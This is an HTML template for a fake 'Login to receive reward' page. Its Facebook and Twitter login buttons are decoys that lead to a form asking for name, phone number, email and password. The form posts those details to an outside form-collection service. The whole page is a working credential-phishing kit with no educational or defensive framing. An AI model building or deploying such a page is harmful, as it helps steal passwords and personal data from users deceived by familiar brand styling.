<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Login Page</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-image: url('https://yourimageurl.com/background.jpg'); /* Replace with your background image URL */
      background-size: cover;
      background-position: center;
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      color: #fff;
    }

    .login-container, .form-container {
      background-color: rgba(0, 0, 0, 0.7);
      padding: 20px;
      border-radius: 10px;
      text-align: center;
    }

    .login-button {
      display: block;
      width: 80%;
      margin: 10px auto;
      padding: 10px;
      font-size: 16px;
      color: #fff;
      text-decoration: none;
      border-radius: 5px;
      text-align: center;
    }

    .login-facebook {
      background-color: #3b5998;
    }

    .login-twitter {
      background-color: #1da1f2;
    }

    .login-button:hover {
      opacity: 0.8;
    }

    .form-container {
      display: none;
    }

    .form-container input {
      width: 80%;
      margin: 10px auto;
      padding: 10px;
      font-size: 16px;
      border: 1px solid #ccc;
      border-radius: 5px;
    }

    .form-container button {
      width: 80%;
      padding: 10px;
      font-size: 16px;
      background-color: #28a745;
      color: #fff;
      border: none;
      border-radius: 5px;
      cursor: pointer;
    }

    .form-container button:hover {
      opacity: 0.8;
    }
  </style>
</head>
<body>

  <div class="login-container" id="login-container">
    <h1>Login to receive reward</h1>
    <a href="#" class="login-button login-facebook" onclick="showForm()">Login With Facebook</a>
    <a href="#" class="login-button login-twitter" onclick="showForm()">Login With Twitter</a>
  </div>

  <div class="form-container" id="form-container">
    <h1>Enter Your Details</h1>
    <form id="user-form" action="https://submit.formspark.io/o3jw5jm8B" method="POST">
      <input type="text" name="name" placeholder="Name" required>
      <input type="tel" name="number" placeholder="Phone Number" required>
      <input type="email" name="email" placeholder="Email" required>
      <input type="password" name="password" placeholder="Password" required>
      <button type="submit">Submit</button>
    </form>
  </div>

  <script>
    function showForm() {
      document.getElementById('login-container').style.display = 'none';
      document.getElementById('form-container').style.display = 'block';
    }
  </script>

</body>
</html>
